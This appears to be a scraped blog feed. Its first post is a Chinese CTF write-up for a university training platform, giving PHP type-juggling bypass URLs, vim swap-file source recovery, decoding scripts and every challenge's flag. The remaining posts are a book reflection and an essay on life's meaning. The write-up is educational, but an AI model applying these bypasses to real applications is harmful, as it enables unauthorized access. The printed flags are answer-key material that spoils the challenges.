请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉） 目标网址：地址 flag为管理员密码的32位md5(小写) 并且加上nctf{}\n手注教程群里面发过。 看不懂的话自行百度\u0026quot;mysql手动注入\u0026quot;查阅相关文章\nPS:用sqlmap等工具做的就不要厚脸皮提交了\n题目貌似坏了，放个 4ct10n 的解答吧。\n密码就在上图BSCmarketing24 然后再md5加密成 f3d6cc916d0739d853e50bc92911dddb flag: nctf{f3d6cc916d0739d853e50bc92911dddb}\n密码重置2 题题被秒，当时我就不乐意了！ 本题来源于CUMT 题目链接\nTIPS: 1.管理员邮箱观察一下就可以找到 2.linux下一般使用vi编辑器，并且异常退出会留下备份文件。(用vim编辑则不会) 3.弱类型bypass\nnctf{thanks_to_cumt_bxs}\n1、按照提示，源码中看到管理员邮箱为admin@nuptzj.cn ；\n2、wget http://nctf.nuptzj.cn/web14/.submit.php.swp ；\n3、vi -r .submit.php.swp\n1 2 3 4 5 6 7 8 9 10 11 12 13 if(!empty($token)\u0026amp;\u0026amp;!empty($emailAddress)){ if(strlen($token)!=10) die(\u0026#39;fail\u0026#39;); if($token!=\u0026#39;0\u0026#39;) die(\u0026#39;fail\u0026#39;); $sql = \u0026#34;SELECT count(*) as num from `user` where token=\u0026#39;$token\u0026#39; AND email=\u0026#39;$emailAddress\u0026#39;\u0026#34;; $r = mysql_query($sql) or die(\u0026#39;db error\u0026#39;); $r = mysql_fetch_assoc($r); $r = $r[\u0026#39;num\u0026#39;]; if($r\u0026gt;0){ echo $flag; }else{ echo \u0026#34;失败了呀\u0026#34;; } } 要求token长度为10且token!='0'为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以'0e123'=='0'值为真）绕过，访问 http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn\u0026amp;token=0e12345678 即可。\nMISC 图种 flag是动态图最后一句话的拼音首字母 加上nctf{}\nnctf{dssdcmlw}\nbinwalk -e 555.gif分离出一张233333.gif，动态图的最后一帧的最后一句话是 都深深的出卖了我\n丘比龙De女神 丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！\n没错 里面隐藏了一张女神的照片 flag是照片文件的md5值(小写) 记住加上flag{}\n文件尾有nvshen.jpg字样，故搜索字符串nvshen，共出现两次，猜测从第一次出现位置上方的love起到文件末尾为一个密码为love的压缩包，复制出来后修改6C6F7665 为504b0304 ,解压得到女神的照片。\nflag{a6caad3aaafa11b6d5ed583bef4d8a54}\n密码学 easy! 密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 这题做不出来就剁手吧！\nnctf{this_is_base64_encode}\n在Linux命令行输入 echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 | base64 -d即可\nkeyboard 看键盘看键盘看键盘！ 答案非标准格式，提交前加上nctf{} ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm\n观察题干字符串在键盘上的位置构成的轨迹。\nnctf{areuhack}\nbase64全家桶 全家桶全家桶全家桶！ 我怎么饿了。。。。。。 密文(解密前删除回车)：\nR1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES 1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVk zREVOUlJHNFpUTU5KVEdFWlRNTjJF\n按base64、base32、base16的顺序解码一遍即可。\nnctf{base64 _ base32_and_base16}\nn次base64 1 2 3 4 5 import base64 as b s=\u0026#39;**\u0026#39; while 1: s=b.b64decode(s) print s nctf{please_use_python_to_decode_base64}\n骚年来一发吗 密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas\n1 2 3 4 5 6 7 8 9 10 function encode($str){ $_o=strrev($str); for($_0=0;$_0\u0026lt;strlrn($_o),$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; } return str_rot13(strrev(base64_encode($_))); } encode函数先反转明文字符串，再逐字符加一，然后base64编码，再反转，再rot13，然后返回加密后的字符串。\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php $s=\u0026#34;iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas\u0026#34;; function decode($str){ $strtmp=base64_decode(strrev(str_rot13($str))); $res=\u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($strtmp);$i++){ $res.=chr(ord(substr($strtmp, $i,1))-1); } return strrev($res); } echo decode($s); nctf{rot13and_base64and_strrev}\nmixed base64 多重base64加密，干(sang)得(xin)漂(bing)亮(kuang)!\n1 2 3 4 5 6 7 8 9 10 11 12 13 import random from base64 import * result={ \u0026#39;16\u0026#39;:lambda x:b16encode(x), \u0026#39;32\u0026#39;:lambda x:b32encode(x), \u0026#39;64\u0026#39;:lambda x:b64encode(x) } flag=b\u0026#34;{nctf{***}\u0026#34; for i in range(10): a=random.choice([\u0026#39;16\u0026#39;,\u0026#39;32\u0026#39;,\u0026#39;64\u0026#39;]) flag=result[a](flag) with open(\u0026#34;code.txt\u0026#34;,\u0026#39;wb\u0026#39;)as f: f.write(flag) 解码代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from base64 import b64decode, b32decode, b16decode with open(\u0026#39;code.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: c = f.read() def trys(s): for f in [b64decode, b32decode, b16decode]: try: t = f(s) if t[:4] == \u0026#34;nctf\u0026#34;: print t return 0 else: trys(t) except: pass trys(c) nctf{random_mixed_base64_encode}\n异性相吸 同性真爱，异性相吸都是假的！ （题目要求，我是直的）\n解密压缩文件里的内容\nTIPS: 1.xor 2.hex2binary 3.len(bin(miwen))==len(bin(mingwen))\n1 2 3 4 5 6 c=open(\u0026#39;密文.txt\u0026#39;).read() p=open(\u0026#39;明文.txt\u0026#39;).read() s=\u0026#39;\u0026#39; for i in range(len(c)): s+=chr(ord(c[i])^ord(p[i])) print s nctf{xor_xor_xor_biubiubiu}\nMD5 python大法好！ 这里有一段丢失的md5密文 e9032???da???08????911513?0???a2 要求你还原出他并且加上nctf{}提交\n已知线索 明文为： TASC?O3RJMV?WDJKX?ZM\n题目来源：安恒杯\n1 2 3 4 5 6 7 8 9 10 11 12 import hashlib pool = \u0026#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; s0 = \u0026#39;TASC?O3RJMV?WDJKX?ZM\u0026#39; ss = s0.split(\u0026#39;?\u0026#39;) m = \u0026#39;e9032???da???08????911513?0???a2\u0026#39; for i in pool: for j in pool: for k in pool: s = ss[0] + i + ss[1] + j + ss[2] + k + ss[3] if hashlib.md5(s).hexdigest()[:5] == m[:5]: print s, hashlib.md5(s).hexdigest() break nctf{e9032994dabac08080091151380478a2}\nVigenere It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)\nTips: 1.The encode pragram is given; 2.Do u no index of coincidence ？ 3.The key is last 6 words of the plain text(with \u0026ldquo;nctf{}\u0026rdquo; when submitted, also without any interpunction)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp #include \u0026lt;stdio.h\u0026gt; #define KEY_LENGTH 2 // Can be anything from 1 to 13 main(){ unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = {0x00, 0x00}; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen(\u0026#34;ptext.txt\u0026#34;, \u0026#34;r\u0026#34;); fpOut = fopen(\u0026#34;ctext.txt\u0026#34;, \u0026#34;w\u0026#34;); i=0; while (fscanf(fpIn, \u0026#34;%c\u0026#34;, \u0026amp;ch) != EOF) { /* avoid encrypting newline characters */ /* In a \u0026#34;real-world\u0026#34; implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create \u0026#34;production-quality\u0026#34; code =) */ if (ch!=\u0026#39;\\n\u0026#39;) { fprintf(fpOut, \u0026#34;%02X\u0026#34;, ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; } } fclose(fpIn); fclose(fpOut); return; } ---------------------------------------------------------------------------------- http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 详见 南邮CTF平台 Vigenere writeup 。\n逆向 Hello,RE! 或许你需要去学习下IDA的使用，但是只需要学一点点就能做这题了 PS:IDA里面按R可以把奇怪的数字变成字符串\n格式为flag{*****}包含flag{}提交\n参考资料： 《IDA Pro 权威指南》 各种CTF比赛的逆向部分的writeup\n1.exe\n拖进IDA，定位到main函数，按F5反编译。对着V5~V10逐个按R将十六进制转为字符串即可。flag{Welcome_To_RE_World!}\nReadAsm2 读汇编是逆向基本功。\n给出的文件是func函数的汇编 main函数如下 输出的结果即为flag，格式为flag{**********}，请连flag{}一起提交\n编译环境为linux gcc x86-64 调用约定为System V AMD64 ABI 请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力\n1 2 3 4 5 6 7 8 9 int main(int argc, char const *argv[]) { char input[] = {0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c}; func(input, 28); printf(\u0026#34;%s\\n\u0026#34;,input+1); return 0; } 参考资料: https://github.com/veficos/reverse-engineering-for-beginners 《汇编语言》王爽 《C 反汇编与逆向分析技术揭秘》\n2.asm :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 00000000004004e6 \u0026lt;func\u0026gt;: 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 4004f8: eb 28 jmp 400522 \u0026lt;func+0x3c\u0026gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40051a: 31 ca xor edx,ecx 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] 400528: 7e d0 jle 4004fa \u0026lt;func+0x14\u0026gt; 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret ","permalink":"https://ret2neo.cn/post/170924nuptctfwp/","summary":"南邮CTF平台网址：\nhttp://ctf.nuptsast.com/challenges http://ctf.nuptzj.cn/challenges WEB 签到题 nctf{flag_admiaanaaaaaaaaaaa}\nctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。\nmd5 collision nctf{md5_collision_is_easy}\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php $md51 = md5(\u0026#39;QNKCDZO\u0026#39;); $a = @$_GET[\u0026#39;a\u0026#39;]; $md52 = @md5($a); if(isset($a)){ if ($a != \u0026#39;QNKCDZO\u0026#39; \u0026amp;\u0026amp; $md51 == $md52) { echo \u0026#34;nctf{*****************}\u0026#34;; } else { echo \u0026#34;false!!!\u0026#34;; }} else{echo \u0026#34;please input a\u0026#34;;} ?\u0026gt; 利用PHP弱类型，前人发现md5(\u0026lsquo;QNKCDZO\u0026rsquo;)=\u0026lsquo;0e830400451993494058024219903391\u0026rsquo;，md5(\u0026lsquo;240610708\u0026rsquo;)=\u0026lsquo;0e462097431906509019562988736854\u0026rsquo;，而因为使用松散比较的缘故，*var_dump(\u0026lsquo;0e830400451993494058024219903391\u0026rsquo;==\u0026lsquo;0e462097431906509019562988736854\u0026rsquo;);*值为真，因此访问 http://chinalover.sinaapp.com/web19/?a=240610708 即可。\n1、在PHP中，@被称为错误控制操作符(error control operator)，前置@符号的表达式产生的任何错误都将被忽略。\n2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。\n3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(type juggling)而后者不会。这种juggle总的来说利大于弊，但确实容易玩脱。\n​\t此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。","title":"南京邮电大学网络攻防训练平台writeup"},{"content":"这是李彦宏写的书，就是饱受诟病却也颇为有用的百度的董事长兼首席执行官。当然，写书的那个时候还没有百度，甚至谷歌也刚成立不久。1999年1月第一版。这是一本小书，采用章回体小说形式，但据称内容全部属实。当然，从作者眼光属实。\n1991年李彦宏毕业于北京大学信息管理专业，后赴美国布法罗纽约州立大学完成计算机科学硕士学位。在美国近十年的时间里，李彦宏先后担任道琼斯公司高级顾问，INFOSEEK工程师，设计了实时金融系统，创建了ESP技术等等等等。1999年底携风投资金回国创建百度。\n全书共十五回合，记录了93-98这几个世界互联网发展最为猛烈的年头里在硅谷发生的一个个惊心动魄的商战故事。其中包括网景，IBM，微软，苹果，美国在线，英特尔，惠普，甲骨文，太阳，迪斯尼，雅虎等等公司间为了扩大市场份额，引领时代走向而进行的商业竞争。他们中有的已是固有领域里固有的龙头老大，有的是新晋的受风投青睐的企图分一杯羹的愣头青，有的则凭着智慧和创新开辟了一个全新的领域，谋划着颠覆传统。他们之间自然免不了斗智斗勇，时而竞争，时而合作，从而上演了一幕幕变化迅速的斗争场面。\n然而谷歌在98年7月才成立，而现在雅虎等等感觉已明显式微，有些公司我们甚至没有听过，当然，不排除是我见识浅薄而且活在墙内的可能。\n短短二十年间，一切着实变化的太快。经过这近一年的自我探索，我发现自己对技术也开始有几分热爱，尤其在感到传统文化可能无力解决信仰问题之后。或许某天，我会开始相信技术和创新才是值得关注的。那或许也不错。\n但无论技术是不是真的有解决人生问题的能力，科技改变生活这一点谁也不能否认。从前的人如何能想像今天的生活呢，今天的人也很难想像未来二三十年的生活，所以我还是很庆幸自己年轻，如果一切顺利我就能看到那些令人无比兴奋的成就了。07年Google推出Android，到今天近十年，这基于linux的平台已经足以和微软抗衡，曾经网景试图颠覆而未成功的如今似乎在一点点实现，我相信未来会有更大的变革，我希望自己能是参与者。\n毕竟我们可以感受到，现在的操作系统还是不够让人爽。\n现在有点庆幸当初进入这个专业。兴趣似乎在一点点被唤醒。希望自己别太懒就好了。\n果然人随着时间变化想法是会变的。我已记不太清从前的一些观点了。这让我有些悲伤。人生仿佛是一场一去不回头的游戏，怀念着的，纠缠着的，困惑着的，挣扎着的，坚信着的，质疑着的到最后都寻不到一丝踪迹。而那些未经历的，也根本无从想像。站在现在，看不见过去，看不见未来，多少有一丝惶恐。但没有关系，接受就好。find you passion.enjoy your life有时这样想想倒也不错，最后或许就相信了呢。\n昨晚看了三傻大闹宝莱坞，兰彻说do not be a coverd .do not be afraid of future.be a good engineer and success will chase you.\n看了一部分的《黑客与画家》，作者的黑客精神很让我感动，我想我需要试着培养。那时宽泛意义上的一种人与社会相处的精神原则。这几天我要把它看完。\n接下去我要看《be here now》就是此时此地.不知道会有什么收获。\n人生确实很奇妙，一切在不紧不慢，迷迷糊糊中却好像井井有条地前进。我前两天看见一个很成功的人说他十四岁上大学，大学很不顺利，也曾抱着《晃晃悠悠》哭的稀里糊涂，后来也一样走出来了。\n我不知道自己十年后会怎样。但或许命运知道。如果没有人安排好一切，那我想怎么走就怎么走就是了，总会有出路的。如果真有力量安排好了一切，那我就更不用担心了，想怎么走就怎么走就是了，出路都固定了。\n(๑•̀ㅂ•́)و✧ (๑•̀ㅂ•́)و✧卖个萌 就酱紫\n","permalink":"https://ret2neo.cn/mind/170628siliconvalleywar/","summary":"这是李彦宏写的书，就是饱受诟病却也颇为有用的百度的董事长兼首席执行官。当然，写书的那个时候还没有百度，甚至谷歌也刚成立不久。1999年1月第一版。这是一本小书，采用章回体小说形式，但据称内容全部属实。当然，从作者眼光属实。\n1991年李彦宏毕业于北京大学信息管理专业，后赴美国布法罗纽约州立大学完成计算机科学硕士学位。在美国近十年的时间里，李彦宏先后担任道琼斯公司高级顾问，INFOSEEK工程师，设计了实时金融系统，创建了ESP技术等等等等。1999年底携风投资金回国创建百度。\n全书共十五回合，记录了93-98这几个世界互联网发展最为猛烈的年头里在硅谷发生的一个个惊心动魄的商战故事。其中包括网景，IBM，微软，苹果，美国在线，英特尔，惠普，甲骨文，太阳，迪斯尼，雅虎等等公司间为了扩大市场份额，引领时代走向而进行的商业竞争。他们中有的已是固有领域里固有的龙头老大，有的是新晋的受风投青睐的企图分一杯羹的愣头青，有的则凭着智慧和创新开辟了一个全新的领域，谋划着颠覆传统。他们之间自然免不了斗智斗勇，时而竞争，时而合作，从而上演了一幕幕变化迅速的斗争场面。\n然而谷歌在98年7月才成立，而现在雅虎等等感觉已明显式微，有些公司我们甚至没有听过，当然，不排除是我见识浅薄而且活在墙内的可能。\n短短二十年间，一切着实变化的太快。经过这近一年的自我探索，我发现自己对技术也开始有几分热爱，尤其在感到传统文化可能无力解决信仰问题之后。或许某天，我会开始相信技术和创新才是值得关注的。那或许也不错。\n但无论技术是不是真的有解决人生问题的能力，科技改变生活这一点谁也不能否认。从前的人如何能想像今天的生活呢，今天的人也很难想像未来二三十年的生活，所以我还是很庆幸自己年轻，如果一切顺利我就能看到那些令人无比兴奋的成就了。07年Google推出Android，到今天近十年，这基于linux的平台已经足以和微软抗衡，曾经网景试图颠覆而未成功的如今似乎在一点点实现，我相信未来会有更大的变革，我希望自己能是参与者。\n毕竟我们可以感受到，现在的操作系统还是不够让人爽。\n现在有点庆幸当初进入这个专业。兴趣似乎在一点点被唤醒。希望自己别太懒就好了。\n果然人随着时间变化想法是会变的。我已记不太清从前的一些观点了。这让我有些悲伤。人生仿佛是一场一去不回头的游戏，怀念着的，纠缠着的，困惑着的，挣扎着的，坚信着的，质疑着的到最后都寻不到一丝踪迹。而那些未经历的，也根本无从想像。站在现在，看不见过去，看不见未来，多少有一丝惶恐。但没有关系，接受就好。find you passion.enjoy your life有时这样想想倒也不错，最后或许就相信了呢。\n昨晚看了三傻大闹宝莱坞，兰彻说do not be a coverd .do not be afraid of future.be a good engineer and success will chase you.\n看了一部分的《黑客与画家》，作者的黑客精神很让我感动，我想我需要试着培养。那时宽泛意义上的一种人与社会相处的精神原则。这几天我要把它看完。\n接下去我要看《be here now》就是此时此地.不知道会有什么收获。\n人生确实很奇妙，一切在不紧不慢，迷迷糊糊中却好像井井有条地前进。我前两天看见一个很成功的人说他十四岁上大学，大学很不顺利，也曾抱着《晃晃悠悠》哭的稀里糊涂，后来也一样走出来了。\n我不知道自己十年后会怎样。但或许命运知道。如果没有人安排好一切，那我想怎么走就怎么走就是了，总会有出路的。如果真有力量安排好了一切，那我就更不用担心了，想怎么走就怎么走就是了，出路都固定了。\n(๑•̀ㅂ•́)و✧ (๑•̀ㅂ•́)و✧卖个萌 就酱紫","title":"《硅谷商战》"},{"content":"人生价值与自我实现 人用生命的价值和意义来说服自己：人的存在不是荒诞。 ——阿贝尔·加缪\n作为人，在生命中或迟或早的某些时刻，我们会忍不住疑惑或是开始追问这样一些问题。\n•\t生命的意义是什么？\n•\t生命究竟是怎样的？\n•\t我们是什么？\n•\t我们为了什么而存在？\n•\t生命的起源是什么？\n•\t生命的本质什么？\n•\t现实的本质是什么？\n•\t生命的存在是否有目的以及它是什么？\n•\t在生命中究竟什么是有价值的？\n•\t存在下去的理由是什么？\n这些问题在不同人身上的萌发时间和所引起的反应是大不相同的，不同的人在这个问题上的在意程度和追究深度也不尽相同，并且不同人得到的答案也未必一致。有些人在生命的早期便热衷于探求这类问题的答案，有些人人到中年才开始思考存在的意义，有些人则兴致缺缺，终其一生没有真正开始严肃地对待这些问题。有些人孜孜不倦，全力以赴，放眼宇内，观今溯古，只为求得一个满意的答案，在没有寻到之前他们食也无味，寝也难安，踽踽独行，郁郁寡欢，鲜有发自内心的快乐与对这个世界的归属感；有些人知天达命，且歌且行，格物致知，用功世事，只在某些深夜里偶忆初心，平添感怀；有些人五根浸尘，受苦贪欢，苶然疲役，不问所归，自始自终只是在追随欲望与满足欲望之间循环往复，如同命运的木偶。\n尽管不同的人在这个问题上表现各异，但相同的是人们都赤条条来到人世，经历生老病死，然后赤条条离开，这就使得不同的人具有某种作为存在的平等性。那么是什么使得一个存在与另一个存在不同，这种不同又是基于什么的讨论，或者这种不同是否被需要，以及为什么，最后是如何去实现这种不同。这便是我们考虑人生价值与自我实现这个命题时所要面对的主要问题。\n致力于实现人生价值与自我期许并不是什么难事，即便最后没能实现或没能彻底实现也无关紧要，因为如果一个人确实找到了其所坚信不移的价值，那么他为实现价值而存在的每一个时刻都必将无比快乐。真正困难的问题在于真正认识人这种存在，真正认识自我，弄清楚什么是价值，什么是有价值，一种价值又何以不同于另一种价值。思考价值，确信价值，最后才是实现价值。\n在一切真正的思考开始之前，我们必须定义何为坚信价值。如果我们说一个人坚信一种价值，那么这种价值对于他应当是根本性的，是源头而不是途经，是目标而不是手段，是衡量一切的根本出发。\n对于一部分人，确信价值是再简单不过的，甚至不需要经过思考。一个简单的思路而普遍的思路就像这样——因为财富与权力可以满足眼耳鼻舌身五根之欲，所以金钱是有价值的，所以我的价值是拥有大的权力和多的财富。这条逻辑链是如此清晰简洁，如此雄辩有力，以至于我险些甚至骗过了自己。实际上，如果一个经过上述我们勉强称之为思考的一番大脑活动后将拥有更多的财富定做自己的人生价值并且打算终生致力于实现它，那么可以预见地，几乎不可避免地，这个人将在人生的某一些时刻感受到这种价值带给他的痛苦。为什么会这样呢？难道追求一种确信的价值无法让人感到始终的愉悦？事情是这样的，如果财富可以粗暴地具象为金钱，那么金钱于这个人并没有价值，拥有金钱也没有，这个人的价值是各种欲望的满足。这个人因为没有认清自己的价值所在而感到痛苦，因为错把手段当目标而痛苦。其实，绝大多数人也是如此。\n如果一个人的价值是满足他的各种欲望，如果这些欲望与其满足欲望的能力存在差距，那么他至少有两条途径，一是增强能力来满足欲望，二是降低欲望来让欲望自己得到满足。这两条途径看上去本身都不会自带痛苦。当然，当一件东西和欲望扯上关系，事情总会变得复杂，无奈很少有东西与欲望毫无干系。此外，这本身是否能作为一种真正的价值来被对待，也是值得怀疑的。\n在我们执着于怀疑时，就会发现没有什么是理所当然的，没有什么是不能怀疑的。我承认这是认识论的一大难题，我不认为这个问题已经得到很好的解决。维特根斯坦前半生致力于考虑用语言描述价值的可能性，这就是在怀疑语言，同时也怀疑价值，实际上至今仍值得怀疑。不知为何其后来同笛卡尔之流一样认为我们必须承认存在一些无可争议的事实作为一切讨论的基础。尽管人们说他同其他学说是不同的，但在我看来这只是不同形式的妥协罢了。因为什么都没有，所以应当要有些什么才好，这是可笑的逻辑，就不能什么都没有吗？当然，什么都没有是痛苦的，面对无尽的深渊，没有语言可以信任，没有价值可以皈依，没有逻辑可以依靠，没有认识能被接受，说实话，那真是暗无天日，我们的整个文明都在怀疑中分崩离析，所有曾经建立起的光辉与荣耀全在一个质问的眼神中缓缓坍塌。\n所以人们决定不怀疑，并将一切怀疑笼统地扔到虚无主义中任其遭受作为异类所难以逃避的攻讦和叱呵。\n在怀疑的世界里，价值是谈不上的，语言是可笑的，追求是愚蠢的，自我是一场谎言，所有的一切都建立在一种不诚实之上，一种自我欺骗之上。我们或许可以称之为实事求是，脚踏实地或是其他的什么，但在怀疑者的严重，只有一个代名词，那就是不诚实。诚实是宝贵的品质，如果一个人，一个种族，不能够诚实地对待自己和自然，那么所有的一切都将建立在欺骗之上，所有的成就与辉煌都将在谎言被揭穿的那一天露出它美丽芬香的面纱下丑陋不堪的真实面目，所有曾被这虚假的美好蒙蔽的年轻人将会深深有感于这一场阴谋的庞大与精心，都将重新认识到所谓价值并不存在，所谓语言都是虚假，所谓梦想全是泡沫，所谓自我，不过是在初升的朝阳面前自顾自赞叹未知光芒的耀眼，而浑然不觉毁灭已迎面到来。而那些曾被背叛，被惩罚的所谓虚无主义者，才会真正的由衷的露出他们具备智慧以来的第一次微笑，他们看到虚无终于是虚无，狂妄终于是狂妄，世间万物各归其序，尽管这是一场失败，但实际上它比胜利更值得开心，如果说在此之前，怀疑依然存在，那么从此以后，怀疑将归于历史，一切现实只余虚无，而这虚无，便是无上的荣耀。\n那么我们会带人生的价值与自我的实现。不论是‘42’的预言，还是“一切都将逝去，唯有死神永生”，又或者是“三世因果，六道轮回”的体系，我们作为人，脆弱的，短见的，狭隘的，被欲望支配的人，我们需要在这十丈软红里寻一处着落，认一个价值。对，我指的不是思考价值，确认价值，然后契而不舍，忠心不渝，不折手段，视死如归地去追逐这个价值，而是认一个价值，单纯草率地，人云亦云地，随波逐流地，得过且过地认一个价值。我们认到了自己的价值之后，不论这个价值是伟大光荣正确的，还是猥琐下流可鄙的，我们需要去实现它。我们如何实现它，我们将除了饮食睡眠，排遗解乏外的一切时间献给他，用一切我们认为正确的方法和手段去靠近他，瓦解他，最后占领他。如果在实现的过程中我们因为实现价值的遥不可及而感到痛苦，那么不要怀疑价值，尽管去痛苦，因为价值存在，而且价值正确，如果为实现阶段性胜利而欣喜若狂，也更不用回头看是否走在正确的道路上，尽管去喜悦，因为价值存在，而且价值正确。\n每个人都应该有一个价值，每个人都注定拥有一个价值。你可以看不清他，可以有所顾虑，可以有所怀疑，但你必须相信他，因为这是你拥有的价值，这是你的价值，这是你将奋尽全力去追逐的价值，也是你得以忘却生命虚无，得以在无尽的人生荒野中义无反顾地前行的唯一动力，至关重要的，并且你无法否认的是，除此之外，你一无所有。所以，在这么多的逻辑凌乱的语句之后，总之请你记住，如果你不想面对那身后空无一物，眼前万丈深渊的绝境，如果你不想体会我曾体会过的那般绝境，请相信我，请相信世上有一种价值值得相信，有一种价值属于你，且只属于你，你应当接受他，像士兵接过令牌，你应当带着他，踏上你仅此一次的征程。士兵，祝你，祝我，顺利。\n","permalink":"https://ret2neo.cn/mind/170614meaningandaction/","summary":"人生价值与自我实现 人用生命的价值和意义来说服自己：人的存在不是荒诞。 